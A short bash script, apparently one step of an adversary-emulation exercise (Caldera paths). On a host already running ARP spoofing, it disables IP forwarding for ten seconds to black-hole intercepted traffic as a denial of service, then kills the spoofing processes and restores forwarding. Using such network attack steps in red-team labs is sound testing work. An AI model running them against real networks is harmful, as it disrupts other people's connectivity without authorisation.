#!/usr/bin/env bash
set -euo pipefail

PIDFILE="$DATA_PATH/KC2/arp_pids"
TIME_DOS=10

# Installing dependencies
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends bash procps >/dev/null 2>&1

echo "DOS enabled for $TIME_DOS seconds"
sysctl -w net.ipv4.ip_forward=0 >/dev/null
sleep $TIME_DOS

echo "Removing arp spoofing..."
/opt/caldera/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
sysctl -w net.ipv4.ip_forward=1 >/dev/null